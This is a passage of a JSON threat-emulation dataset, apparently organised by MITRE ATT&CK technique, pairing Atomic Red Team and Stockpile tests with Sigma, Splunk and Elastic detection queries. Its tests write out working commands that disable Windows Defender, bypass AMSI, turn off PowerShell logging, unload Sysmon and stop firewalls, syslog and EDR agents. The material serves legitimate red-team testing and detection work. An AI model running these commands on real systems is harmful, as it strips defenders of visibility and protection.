McAfeeDLPAgentService start= disabled\n", "$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')\n$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0\n", "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", {"windows": {"psh": {"cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0", "command": "Set-MPPreference -DisableRealtimeMonitoring 1\n"}}}, {"windows": {"psh": {"cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n", "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n"}}}, "powershell/management/disable_rdp", "powershell/management/disable_rdp"], "technique_id": "T1089", "parsed_datasets": [{"Atomic Red Team Test - Disabling Security Tools": {"display_name": "Disabling Security Tools", "atomic_tests": [{"description": "Disables the iptables firewall\n", "supported_platforms": ["linux"], "name": "Disable iptables firewall", "executor": {"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "name": "sh"}}, {"description": "Disables syslog collection\n", "supported_platforms": ["linux"], "name": "Disable syslog", "executor": {"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n", "name": "sh"}}, {"description": "Disable the Cb Response service\n", "supported_platforms": ["linux"], "name": "Disable Cb Response", "executor": {"command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "name": "sh"}}, {"description": "Disables SELinux enforcement\n", "supported_platforms": ["linux"], "name": "Disable SELinux", "executor": {"command": "setenforce 0\n", "name": "sh"}}, {"description": "Disables Carbon Black Response\n", "supported_platforms": ["macos"], "name": "Disable Carbon Black Response", "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n", "name": "sh"}}, {"description": "Disables LittleSnitch\n", "supported_platforms": ["macos"], "name": "Disable LittleSnitch", "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "name": "sh"}}, {"description": "Disables OpenDNS Umbrella\n", "supported_platforms": ["macos"], "name": "Disable OpenDNS Umbrella", "executor": {"command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "name": "sh"}}, {"dependencies": [{"description": "Sysmon filter must be loaded\n", "get_prereq_command": "echo Automated installer not implemented yet, please install Sysmon manually\n", "prereq_command": "fltmc.exe filters | findstr #{sysmon_driver}\n"}], "supported_platforms": ["windows"], "name": "Unload Sysmon Filter Driver", "executor": {"prereq_command": "fltmc.exe filters | findstr #{sysmon_driver}\n", "elevation_required": true, "command": "fltmc.exe unload #{sysmon_driver}\n", "cleanup_command": "sc stop sysmon\nfltmc.exe load #{sysmon_driver}\nsc start sysmon\n", "name": "command_prompt"}, "input_arguments": {"sysmon_driver": {"default": "SysmonDrv", "type": "string", "description": "The name of the Sysmon filter driver (this can change from the default)"}}, "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service.\n"}, {"description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n", "supported_platforms": ["windows"], "name": "Disable Windows IIS HTTP Logging", "input_arguments": {"website_name": {"default": "Default Web Site", "type": "string", "description": "The name of the website on a server"}}, "executor": {"prereq_command": "if(Test-Path C:\\Windows\\System32\\inetsrv\\appcmd.exe) {exit 0} else {exit 1}\n", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "cleanup_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false\n", "name": "powershell"}}, {"dependencies": [{"description": "Sysmon executable must be available\n", "get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n", "prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n"}, {"description": "Sysmon must be installed\n", "get_prereq_command": "cmd /c sysmon -i -accepteula\n", "prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n"}], "supported_platforms": ["windows"], "name": "Uninstall Sysmon", "executor": {"elevation_required": true, "command": "sysmon -u\n", "name": "command_prompt", "cleanup_command": "sysmon -i -accepteula\n"}, "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n", "input_arguments": {"sysmon_exe": {"default": "PathToAtomicsFolder\\T1089\\bin\\sysmon.exe", "type": "Path", "description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)"}}, "dependency_executor_name": "powershell"}, {"description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n", "supported_platforms": ["windows"], "name": "AMSI Bypass - AMSI InitFailed", "executor": {"elevation_required": false, "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "name": "powershell", "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"}}, {"description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key.\n", "supported_platforms": ["windows"], "name": "AMSI Bypass - Remove AMSI Provider Reg Key", "executor": {"elevation_required": true, "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "name": "powershell", "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\"\n"}}, {"description": "With administrative rights, an adversary can disable Windows Services related to security products.\n", "supported_platforms": ["windows"], "name": "Disable Arbitrary Security Windows Service", "input_arguments": {"service_name": {"default": "McAfeeDLPAgentService", "type": "String", "description": "The name of the service to stop"}}, "executor": {"elevation_required": true, "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n", "name": "command_prompt", "cleanup_command": "sc.exe config #{service_name} start= auto\nnet.exe start #{service_name}\n"}}, {"description": "An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.\n\nCredit to Matt Graeber (@mattifestation) for the research.\n", "supported_platforms": ["windows"], "name": "Disable PowerShell Script Block Logging", "executor": {"elevation_required": false, "command": "$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')\n$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0\n", "name": "powershell", "cleanup_command": "$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')\n$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1\n"}}, {"description": "An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.\n\nCredit to Matt Graeber (@mattifestation) for the research.\n", "supported_platforms": ["windows"], "name": "PowerShell Bypass of AntiMalware Scripting Interface", "executor": {"elevation_required": false, "command": "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "name": "powershell"}}, {"description": "Attempting to disable scheduled scanning and other parts of windows defender atp\n", "supported_platforms": ["windows"], "name": "Tamper with Windows Defender ATP PowerShell", "executor": {"elevation_required": true, "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "name": "powershell", "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n"}}, {"description": "Attempting to disable scheduled scanning and other parts of windows defender atp\n", "supported_platforms": ["windows"], "name": "Tamper with Windows Defender Command Prompt", "executor": {"elevation_required": true, "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "name": "command_prompt", "cleanup_command": "sc start WinDefend\nsc config WinDefend start=enabled\n"}}, {"description": "Disable Windows Defender from starting after a reboot\n", "supported_platforms": ["windows"], "name": "Tamper with Windows Defender Registry", "executor": {"elevation_required": true, "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "name": "powershell", "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n"}}, {"description": "Gorgon group may disable Office security features so that their code can run\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "name": "Disable Microft Office Security Features", "executor": {"elevation_required": false, "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\"\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\n"}}, {"description": "Removing definition files would cause ATP to not fire for AntiMalware\nCheck MpCmdRun.exe man page for info on all arguments\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "name": "Remove Windows Defender Definition Files", "executor": {"elevation_required": true, "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "name": "command_prompt"}}], "attack_technique": "T1089"}}, {"Mitre Stockpile - Disable Windows Defender Real-Time Protection": {"platforms": {"windows": {"psh": {"cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0", "command": "Set-MPPreference -DisableRealtimeMonitoring 1\n"}}}, "description": "Disable Windows Defender Real-Time Protection", "tactic": "defense-evasion", "technique": {"attack_id": "T1089", "name": "Disabling Security Tools"}, "id": "49470433-30ce-4714-a44b-bea9dbbeca9a", "name": "Disable Windows Defender Real-Time Protection"}}, {"Mitre Stockpile - Disable Windows Defender All": {"platforms": {"windows": {"psh": {"cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n", "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n"}}}, "description": "Disable Windows Defender All", "tactic": "defense-evasion", "technique": {"attack_id": "T1089", "name": "Disabling Security Tools"}, "id": "b007f6e8-4a87-4440-8888-29ceab047d9b", "name": "Disable Windows Defender All"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1089", "Empire Module": "powershell/management/disable_rdp", "Technique": "Disabling Security Tools", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/management/disable_rdp\":  [\"T1089\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"net.exe\"or process_path contains \"sc.exe\")and file_directory contains \"stop\"", "product": "Azure Sentinel", "name": "Disabling Security Tools Service Stopped"}, {"query": "title: Disable security events logging adding reg key MiniNt\nid: 919f2ef0-be2d-4a7a-b635-eb2b41fde044\nstatus: experimental\ndescription: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events.\nreferences:\n    - https://twitter.com/0gtweet/status/1182516740955226112\ntags:\n    - attack.defense_evasion\n    - attack.t1089\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: 12 # key create\n        TargetObject|contains: '\\SYSTEM\\'\n        TargetObject|endswith: '\\Control\\MiniNt'\n      - EventID: 14  # key rename\n        NewName|contains: '\\SYSTEM\\'\n        NewName|endswith: '\\Control\\MiniNt'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Disable security events logging adding reg key MiniNt\nid: 919f2ef0-be2d-4a7a-b635-eb2b41fde044\nstatus: experimental\ndescription: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events.\nreferences:\n    - https://twitter.com/0gtweet/status/1182516740955226112\ntags:\n    - attack.defense_evasion\n    - attack.t1089\nauthor: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/13\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n      - EventID: 12 # key create\n        TargetObject|contains: '\\SYSTEM\\'\n        TargetObject|endswith: '\\Control\\MiniNt'\n      - EventID: 14  # key rename\n        NewName|contains: '\\SYSTEM\\'\n        NewName|endswith: '\\Control\\MiniNt'\n    condition: selection\nfields:\n    - EventID\n    - Image\n    - TargetObject\n    - NewName\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"12\" AND TargetObject.keyword:*\\\\\\\\SYSTEM\\\\* AND TargetObject.keyword:*\\\\\\\\Control\\\\\\\\MiniNt) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SYSTEM\\\\* AND NewName.keyword:*\\\\\\\\Control\\\\\\\\MiniNt))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Disable-security-events-logging-adding-reg-key-MiniNt <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Disable security events logging adding reg key MiniNt\",\\n    \"description\": \"Detects the addition of a key \\'MiniNt\\' to the registry. Upon a reboot, Windows Event Log service will stopped write events.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1089\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"12\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\MiniNt) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\MiniNt))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"12\\\\\" AND TargetObject.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND TargetObject.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\MiniNt) OR (EventID:\\\\\"14\\\\\" AND NewName.keyword:*\\\\\\\\\\\\\\\\SYSTEM\\\\\\\\* AND NewName.keyword:*\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\MiniNt))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Disable security events logging adding reg key MiniNt\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n     EventID = {{_source.EventID}}\\\\n       Image = {{_source.Image}}\\\\nTargetObject = {{_source.TargetObject}}\\\\n     NewName = {{_source.NewName}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"12\" AND TargetObject.keyword:*\\\\\\\\SYSTEM\\\\* AND TargetObject.keyword:*\\\\\\\\Control\\\\\\\\MiniNt) OR (EventID:\"14\" AND NewName.keyword:*\\\\\\\\SYSTEM\\\\* AND NewName.keyword:*\\\\\\\\Control\\\\\\\\MiniNt))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"12\" TargetObject=\"*\\\\\\\\SYSTEM\\\\*\" TargetObject=\"*\\\\\\\\Control\\\\\\\\MiniNt\") OR (EventID=\"14\" NewName=\"*\\\\\\\\SYSTEM\\\\*\" NewName=\"*\\\\\\\\Control\\\\\\\\MiniNt\")) | table EventID,Image,TargetObject,NewName", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"12\" TargetObject=\"*\\\\\\\\SYSTEM\\\\*\" TargetObject=\"*\\\\\\\\Control\\\\\\\\MiniNt\") OR (event_id=\"14\" NewName=\"*\\\\\\\\SYSTEM\\\\*\" NewName=\"*\\\\\\\\Control\\\\\\\\MiniNt\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*12)(?=.*.*\\\\SYSTEM\\\\.*)(?=.*.*\\\\Control\\\\MiniNt))|.*(?:.*(?=.*14)(?=.*.*\\\\SYSTEM\\\\.*)(?=.*.*\\\\Control\\\\MiniNt))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Weak Encryption Enabled and Kerberoast\nid: f6de9536-0441-4b3f-a646-f4e00f300ffd\ndescription: Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.\nreferences:\n    - https://adsecurity.org/?p=2053\n    - https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/\nauthor: '@neu5ron'\ntags:\n    - attack.defense_evasion\n    - attack.t1089\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\ndetection:\n    selection:\n        EventID: 4738\n    keywords:\n        Message:\n        - '*DES*'\n        - '*Preauth*'\n        - '*Encrypted*'\n    filters:\n        Message:\n            - '*Enabled*'\n    condition: selection and keywords and filters\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Weak Encryption Enabled and Kerberoast\nid: f6de9536-0441-4b3f-a646-f4e00f300ffd\ndescription: Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.\nreferences:\n    - https://adsecurity.org/?p=2053\n    - https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/\nauthor: '@neu5ron'\ntags:\n    - attack.defense_evasion\n    - attack.t1089\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\ndetection:\n    selection:\n        EventID: 4738\n    keywords:\n        Message:\n        - '*DES*'\n        - '*Preauth*'\n        - '*Encrypted*'\n    filters:\n        Message:\n            - '*Enabled*'\n    condition: selection and keywords and filters\nfalsepositives: \n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4738\" AND Message.keyword:(*DES* OR *Preauth* OR *Encrypted*) AND Message.keyword:(*Enabled*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Weak-Encryption-Enabled-and-Kerberoast <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Weak Encryption Enabled and Kerberoast\",\\n    \"description\": \"Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1089\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4738\\\\\" AND Message.keyword:(*DES* OR *Preauth* OR *Encrypted*) AND Message.keyword:(*Enabled*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4738\\\\\" AND Message.keyword:(*DES* OR *Preauth* OR *Encrypted*) AND Message.keyword:(*Enabled*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Weak Encryption Enabled and Kerberoast\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4738\" AND Message.keyword:(*DES* *Preauth* *Encrypted*) AND Message.keyword:(*Enabled*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4738\" (Message=\"*DES*\" OR Message=\"*Preauth*\" OR Message=\"*Encrypted*\") (Message=\"*Enabled*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4738\" Message IN [\"*DES*\", \"*Preauth*\", \"*Encrypted*\"] Message IN [\"*Enabled*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4738)(?=.*(?:.*.*DES.*|.*.*Preauth.*|.*.*Encrypted.*))(?=.*(?:.*.*Enabled.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1090/T1090.yaml", "command": "export #{proxy_scheme}_proxy=127.0.0.1:8080\n", "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": "export http_proxy=127.0.0.1:8080\n", "name": null}, {"source": "atomics/T1090/T1090.yaml", "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/socks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/socks", "name": "Empire Module Command"}], "command_list": ["export #{proxy_scheme}_proxy=127.0.0.1:8080\n", "export http_proxy=127.0.0.1:8080\n", "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=127.0.0.1", "python/management/multi/socks", "python/management/multi/socks"], "technique_id": "T1090", "parsed_datasets": [{"Atomic Red Team Test - Connection Proxy": {"display_name": "Connection Proxy", "atomic_tests": [{"description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n", "supported_platforms": ["macos", "linux"], "name": "Connection Proxy", "input_arguments": {"proxy_server": {"default": "127.0.0.1:8080", "type": "url", "description": "Proxy server URL (host:port)"}, "proxy_scheme": {"default": "http", "type": "string", "description": "Protocol to proxy (http or https)"}}, "executor": {"command": "export #{proxy_scheme}_proxy=#{proxy_server}\n", "name": "sh", "cleanup_command": "unset http_proxy\nunset https_proxy\n"}}, {"description": "Adds a registry key to set up a proxy on the endpoint at\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\n", "supported_platforms": ["windows"], "name": "portproxy reg key", 